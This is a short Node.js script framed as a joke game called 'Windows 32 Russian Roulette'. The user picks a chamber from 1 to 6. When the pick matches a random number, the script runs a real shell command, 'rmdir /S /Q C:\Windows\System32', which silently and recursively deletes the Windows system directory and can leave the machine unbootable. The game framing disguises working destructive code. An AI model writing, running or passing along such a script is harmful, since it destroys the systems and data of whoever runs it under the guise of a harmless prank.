const readline = require('readline');
const { exec } = require('child_process');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

console.log("Welcome to Windows 32 Russian Roulette!");
const bullet = Math.floor(Math.random() * 6) + 1;

rl.question("Pick a chamber (1-6): ", (chamber) => {
    if (parseInt(chamber) === bullet) {
        console.log("Oops! Looks like you just deleted Windows 32. Good luck reinstalling! 💻💥");
        exec('rmdir /S /Q C:\\Windows\\System32', (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error.message}`);
                return;
            }
            if (stderr) {
                console.error(`stderr: ${stderr}`);
                return;
            }
            console.log(`stdout: ${stdout}`);
        });
    } else {
        console.log("Phew! You survived... this time. Try again if you dare!🔫😅");
    }
    rl.close();
});
